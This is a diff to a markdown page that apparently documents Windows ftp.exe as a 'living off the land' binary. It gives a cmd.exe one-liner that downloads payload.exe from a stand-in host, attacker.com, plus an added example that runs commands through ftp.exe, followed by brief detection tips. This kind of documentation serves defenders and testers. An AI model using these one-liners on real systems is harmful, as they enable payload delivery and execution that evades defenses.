@@ -85,7 +85,7 @@ SFTP (SSH File Transfer Protocol) → entirely different protocol built on SSH, 
    ftp.exe is the command-line FTP (File Transfer Protocol) client that comes built into Windows. It allows you to connect to remote FTP servers and transfer files    (upload/download) using simple text-based commands.
    A binary designed for connecting to FTP servers
 
-Scenario 1: Download
+- ###### Scenario 1: Download
 
 ```shell
 cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
@@ -98,3 +98,25 @@ Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Window
 
 Attack type: Command and Control , Exfil
   
+###### Scenario 2 : Execute
+Executes the commands you put inside the text file.
+
+```cmd
+echo !cmd /c c:\windows\system32\calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt
+```
+
+Use case
+Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand
+
+
+Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+
+Attack type: Execution
+
+
+##### Detection:
+- monitoring theses paths:
+   C:\Windows\System32\ftp.exe
+   C:\Windows\SysWOW64\ftp.exe
+  
+- monitoring port 21 
